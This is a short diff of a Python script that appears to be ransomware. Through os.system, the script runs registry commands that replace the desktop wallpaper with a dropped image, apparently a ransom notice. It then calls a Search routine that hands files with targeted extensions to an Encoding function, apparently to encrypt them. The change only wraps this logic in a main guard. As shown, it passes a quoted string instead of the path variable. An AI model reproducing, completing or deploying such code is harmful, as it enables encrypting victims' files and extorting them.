@@ -44,15 +44,16 @@ def Search(dirname):
             if Target(Extension) == True:
                 Encoding(full_filename)
 
-desktopPath = os.path.expanduser('~')
-filepath = '"' + desktopPath + '\\desktop\\rdm\\837477.jpg" /f'
-reg_key_1 = 'reg add "hkcu\control panel\desktop" /v wallpaper /t REG_SZ /d ' + filepath
-reg_key_2 = 'reg add "hkcu\control panel\desktop" /v WallpaperStyle /t REG_SZ /d 0 /f'
+if __name__ == "__main__":
+    desktopPath = os.path.expanduser('~')
+    filepath = '"' + desktopPath + '\\desktop\\rdm\\837477.jpg" /f'
+    reg_key_1 = 'reg add "hkcu\control panel\desktop" /v wallpaper /t REG_SZ /d ' + filepath
+    reg_key_2 = 'reg add "hkcu\control panel\desktop" /v WallpaperStyle /t REG_SZ /d 0 /f'
 
 
-os.system(reg_key_1)
-os.system(reg_key_2)
-os.system("RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters ,1 ,True")
-
-target_local = desktopPath + '\\desktop'
-Search('target_local')
+    os.system(reg_key_1)
+    os.system(reg_key_2)
+    os.system("RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters ,1 ,True")
+    
+    target_local = desktopPath + '\\desktop'
+    Search('target_local')
